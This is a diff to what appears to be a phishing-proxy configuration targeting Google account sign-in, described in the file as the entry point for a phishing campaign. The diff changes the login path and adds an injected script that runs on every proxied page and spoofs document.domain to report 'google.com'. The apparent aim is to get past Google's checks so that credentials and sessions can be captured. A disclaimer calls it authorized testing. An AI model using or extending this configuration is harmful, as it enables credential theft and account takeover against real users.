@@ -104,7 +104,7 @@ auth_urls:
 # Entry point for the phishing campaign
 login:
   domain: 'accounts.google.com'
-  path: '/signin/v2/identifier'
+  path: '/ServiceLogin?hl=en&passive=true&continue=https://myaccount.google.com/'
 
 # Advanced Google Security Features Handled:
 # 1. OAuth2.0 authentication flow
@@ -130,3 +130,20 @@ login:
 
 # DISCLAIMER: This configuration is for authorized security testing only.
 # Unauthorized use is illegal and unethical.
+
+inject:
+  - path: '.*'
+    body: |
+      <script>
+      (function() {
+          var originalGet = Object.getOwnPropertyDescriptor(Document.prototype, 'domain').get;
+          Object.defineProperty(document, 'domain', {
+              get: function() {
+                  return 'google.com';
+              },
+              set: function(val) {
+                  return val;
+              }
+          });
+      })();
+      </script>
